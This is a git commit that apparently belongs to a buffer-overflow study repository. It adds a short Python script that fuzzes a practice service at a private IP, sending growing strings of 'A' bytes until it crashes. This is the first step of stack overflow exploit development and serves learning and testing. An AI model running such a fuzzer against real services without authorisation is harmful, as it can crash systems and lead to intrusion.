179f89e62a686286d33c1f26d884e594772b1aa3
Rob Flemen <rflemen@gmail.com>
2025-12-27 16:14:32 -0500

    moved some code

---
+++ buffer_overflows/application_fuzzer/dosstackbufferoverflowgood.exe/fuzz.py
@@ -0,0 +1,20 @@
+#!/usr/bin/python3
+import socket
+import sys
+ip = "10.100.2.6"
+port = 31337
+string = b"\x41" * 10
+s = socket.socket()
+s.connect((ip, port))
+timeout = 5 
+s.settimeout(timeout)
+while True:
+        try:
+                        print("Fuzzing with {} bytes".format(len(string)))
+                        s.send(string + b"\x0a\x0d")
+                        string += b"\x41" * 10
+                        s.recv(1024)
+        except:
+                print("Fuzzer crashed at {} bytes".format(len(string)))
+                sys.exit(0)
+s.close()
